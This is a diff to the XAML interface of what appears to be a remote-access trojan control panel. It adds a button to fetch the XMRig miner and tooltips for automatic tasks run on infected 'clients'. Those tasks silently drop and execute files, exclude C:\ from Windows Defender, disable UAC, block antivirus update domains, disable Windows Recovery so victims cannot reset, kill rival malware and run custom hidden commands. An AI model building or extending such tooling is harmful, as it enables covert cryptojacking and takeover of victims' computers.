@@ -280,7 +280,7 @@
                                     </LinearGradientBrush>
                                 </Run.Foreground>
                             </Run>
-                            <Run Text=" v1.3.0" Foreground="#C8922A" FontSize="10" FontWeight="Normal"/>
+                            <Run Text=" v1.3.1" Foreground="#C8922A" FontSize="10" FontWeight="Normal"/>
                         </TextBlock>
                     </StackPanel>
 
@@ -1297,8 +1297,34 @@
                                 <Border Margin="0,0,0,12" Padding="8,6" CornerRadius="6"
                                         Background="#0CF59E0B" BorderThickness="1.5" BorderBrush="#50F59E0B">
                                     <StackPanel>
-                                        <TextBlock Text="XMRIG BINARY" Foreground="#99F59E0B"
-                                                   FontSize="9" FontWeight="Bold" FontFamily="Consolas" Margin="0,0,0,3"/>
+                                        <DockPanel Margin="0,0,0,3">
+                                            <TextBlock Text="XMRIG BINARY" Foreground="#99F59E0B"
+                                                       FontSize="9" FontWeight="Bold" FontFamily="Consolas"
+                                                       VerticalAlignment="Center"/>
+                                            <Button DockPanel.Dock="Right" Content="↗ Download" Height="18"
+                                                    FontSize="9" FontWeight="SemiBold" FontFamily="Segoe UI"
+                                                    Padding="6,0" Cursor="Hand"
+                                                    Background="#1AF59E0B" BorderBrush="#40F59E0B" BorderThickness="1"
+                                                    Foreground="#C8F59E0B"
+                                                    ToolTip="Open XMRig latest release on GitHub"
+                                                    Click="BldMnrDownloadXmrig_Click">
+                                                <Button.Template>
+                                                    <ControlTemplate TargetType="Button">
+                                                        <Border x:Name="bd" Background="{TemplateBinding Background}"
+                                                                BorderBrush="{TemplateBinding BorderBrush}"
+                                                                BorderThickness="{TemplateBinding BorderThickness}"
+                                                                CornerRadius="3" Padding="{TemplateBinding Padding}">
+                                                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
+                                                        </Border>
+                                                        <ControlTemplate.Triggers>
+                                                            <Trigger Property="IsMouseOver" Value="True">
+                                                                <Setter TargetName="bd" Property="Background" Value="#30F59E0B"/>
+                                                            </Trigger>
+                                                        </ControlTemplate.Triggers>
+                                                    </ControlTemplate>
+                                                </Button.Template>
+                                            </Button>
+                                        </DockPanel>
                                         <TextBlock x:Name="BldMnrXmrigPath" Text="Searching…"
                                                    Foreground="#7880A8" FontSize="11" TextTrimming="CharacterEllipsis"/>
                                     </StackPanel>
@@ -1497,17 +1523,38 @@
                             </Grid.RowDefinitions>
 
                             <StackPanel Margin="0,0,0,14">
+                                <TextBlock Foreground="#505870" FontSize="11" FontFamily="Segoe UI"
+                                           HorizontalAlignment="Center" Margin="0,0,0,8" TextWrapping="Wrap" TextAlignment="Center">
+                                    <Run FontWeight="SemiBold" Foreground="#8090B8">AutoTasks</Run>
+                                    <Run> are actions automatically executed on newly connected clients. Each task runs exactly </Run>
+                                    <Run FontWeight="SemiBold" Foreground="#8090B8">once per HWID</Run>
+                                    <Run> so re-connecting clients are not affected again.</Run>
+                                </TextBlock>
                                 <WrapPanel HorizontalAlignment="Center" Margin="0,0,0,8">
-                                    <Button Content="ADD FILE"     Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_AddFile_Click" />
-                                    <Button Content="EXCLUDE C:"   Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_ExcludeCDrive_Click"
-                                            ToolTip="Exclude C:\ from Defender via C++ DLL plugin (SYSTEM token, WMI)." />
-                                    <Button Content="DISABLE UAC"  Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_DisableUAC_Click" />
-                                    <Button Content="BLOCK AV DNS" Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockAvDomains_Click" />
-                                    <Button Content="BLOCK RESET"  Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockReset_Click"
-                                            ToolTip="Disable Windows Recovery (reagentc /disable)" />
-                                    <Button Content="BOTKILLER"    Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BotKiller_Click"
-                                            ToolTip="Kill known RATs/miners, remove their persistence from Run keys and startup folder." />
-                                    <Button Content="REMOVE"       Height="30" Margin="4" Style="{StaticResource SBtn}"      Click="AutoTask_Remove_Click" />
+                                    <Button Content="ADD FILE"     Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_AddFile_Click">
+                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Add File</Run>&#x0a;Upload an executable or script that will be dropped and run silently on every new client. The file is stored in the server and sent once per HWID.</TextBlock></ToolTip></Button.ToolTip>
+                                    </Button>
+                                    <Button Content="EXCLUDE C:"   Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_ExcludeCDrive_Click">
+                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Exclude C:\</Run>&#x0a;Adds C:\ to Windows Defender's exclusion list via WMI (requires SYSTEM/Admin). Prevents Defender from scanning or quarantining files on the C drive.</TextBlock></ToolTip></Button.ToolTip>
+                                    </Button>
+                                    <Button Content="DISABLE UAC"  Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_DisableUAC_Click">
+                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Disable UAC</Run>&#x0a;Sets EnableLUA=0 and disables all UAC consent prompts via registry. Requires Admin. Takes effect after next reboot — future processes run elevated without any popup.</TextBlock></ToolTip></Button.ToolTip>
+                                    </Button>
+                                    <Button Content="BLOCK AV DNS" Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockAvDomains_Click">
+                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Block AV DNS</Run>&#x0a;Blocks update/telemetry domains of common antivirus products (Windows Defender, Kaspersky, ESET, Bitdefender, etc.) via the hosts file. Prevents AV signature updates and cloud lookups.</TextBlock></ToolTip></Button.ToolTip>
+                                    </Button>
+                                    <Button Content="BLOCK RESET"  Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockReset_Click">
+                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Block Reset</Run>&#x0a;Disables Windows Recovery Environment (WinRE) via reagentc /disable. Prevents the user from booting into recovery mode or resetting the PC to factory defaults.</TextBlock></ToolTip></Button.ToolTip>
+                                    </Button>
+                                    <Button Content="BOTKILLER"    Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_BotKiller_Click">
+                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">BotKiller</Run>&#x0a;Scans for and terminates unsigned processes with random-looking names (common RAT/miner pattern). Also removes their persistence from Run registry keys and the Startup folder.</TextBlock></ToolTip></Button.ToolTip>
+                                    </Button>
+                                    <Button Content="CUSTOM"       Height="30" Margin="4" Style="{StaticResource SGreenBtn}" Click="AutoTask_Custom_Click">
+                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Custom Command</Run>&#x0a;Enter a custom PowerShell or CMD command that will be silently executed on every new client once per HWID.</TextBlock></ToolTip></Button.ToolTip>
+                                    </Button>
+                                    <Button Content="REMOVE"       Height="30" Margin="4" Style="{StaticResource SBtn}"      Click="AutoTask_Remove_Click">
+                                        <Button.ToolTip><ToolTip><TextBlock MaxWidth="280" TextWrapping="Wrap"><Run FontWeight="Bold">Remove</Run>&#x0a;Removes the selected task(s) from the AutoTask list. Already-executed instances on clients are not reversed.</TextBlock></ToolTip></Button.ToolTip>
+                                    </Button>
                                 </WrapPanel>
                                 <TextBlock Text="Tasks execute once per HWID"
                                            Foreground="#606880" FontSize="11"
